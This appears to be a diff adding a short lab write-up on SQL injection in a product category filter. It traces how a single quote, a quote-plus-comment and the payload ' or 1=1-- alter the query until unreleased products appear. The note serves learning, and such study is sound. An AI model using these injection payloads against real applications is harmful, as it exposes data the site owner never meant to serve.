@@ -1,0 +1,17 @@
+SQL injection - product category filter
+Goal: Display all products both released and unreleased.
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
+
+Analysis:
+SELECT * FROM products WHERE category = 'Pets' AND released = 1
+
+' Gives us an internal error, it becomes the second '
+SELECT * FROM products WHERE category = ''' AND released = 1 
+
+'-- Gives us nothing back, ' becomes the second ' and the rest gets commented out
+SELECT * FROM products WHERE category = ''--' AND released = 1 
+SELECT * FROM products WHERE category = ''
+
+' or 1=1-- Performs injection, ' becomes the second ' or 1=1 and the rest gets commented out
+SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 
